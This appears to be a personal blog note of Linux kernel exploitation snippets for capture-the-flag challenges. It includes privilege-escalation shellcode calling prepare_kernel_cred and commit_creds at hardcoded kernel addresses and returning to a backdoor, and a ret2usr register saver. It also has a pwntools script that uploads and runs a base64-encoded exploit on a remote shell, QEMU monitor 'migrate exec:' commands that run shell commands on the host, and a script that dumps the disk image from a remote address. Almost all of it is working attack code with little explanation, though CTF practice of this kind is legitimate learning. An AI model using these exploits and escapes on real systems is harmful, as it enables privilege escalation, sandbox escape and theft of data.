---
title: Kernel
date: 2024-09-18 17:30:16
---

# extract-vmlinux
- 用法： ```extract-vmlinux ./bzImage > vmlinux ```
- code :
```sh
#!/bin/sh
check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```

# pack.sh
```sh
gcc -o exploit -static $1
mv ./exploit ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```
# unpack.sh
```sh
mkdir initramfs
cd initramfs
cp ../initramfs.cpio .
cpio -idm < ./initramfs.cpio
rm initramfs.cpio
```

# ret2usr
```C
size_t user_sp, user_cs, user_ss, user_rflags;
void save_user_land()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_sp, rsp;"
        "mov user_ss, ss;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved userland registers");
    printf("[#] cs: 0x%lx \n", user_cs);
    printf("[#] ss: 0x%lx \n", user_ss);
    printf("[#] rsp: 0x%lx \n", user_sp);
    printf("[#] rflags: 0x%lx \n\n", user_rflags);
}
```

# shellcode
```C
unsigned long user_rip = (unsigned long)backdoor;
void lpe()
{
    __asm(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" // prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax;" // prepare_kernel_cred(0);
        "mov rdi, rax;"
        "mov rax, 0xffffffff814c6410;" // commit_creds
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;");
}
```

# Remote Exp
```python
from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit ")
    break

p.interactive()
```

# Monitor

如果没有-monitor /dev/null则可以在qemu启动时按`ctrl+a`然后`c`进入monitor控制台
解压文件系统读取flag
```
migrate "exec:cp rootfs.img /tmp"
migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
migrate "exec:cat /tmp/flag 1>&2"
```

```python
from pwn import *
from tqdm import trange
import fuckpy3
context(os='linux', arch='amd64', log_level='error')
p = process(argv='./start.sh', raw=False)
p = remote('82.157.40.132', 38500)
def main():
    ctrl_a = '\x01c'
    p.send(ctrl_a)
    s = b''
    p.sendlineafter('(qemu)', 'stop')
    # p.sendlineafter('(qemu)', 'xp/100000bc 0x000000')     
    p.sendlineafter('(qemu)', 'drive_add 0 file=/rootfs.img,id=flag,format=raw,if=none,readonly=on')
    for i in trange(160):
        p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x4000"')
        p.recvuntil('\r\n')
        data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
        for d in data:
            s += b''.join(d.split()[1:17]).unhex()
    i = 160
    p.sendlineafter('(qemu)', f'qemu-io flag "read -v {0x4000*i} 0x600"')
    p.recvuntil('\r\n')
    data = p.recvuntil('ops/sec)\n', drop=True).split(b'\n')[:-2]
    for d in data:
        s += b''.join(d.split()[1:17]).unhex()
    with open('out.img','wb') as f:
        f.write(s)
    p.interactive()
if __name__ == '__main__':
    main()
```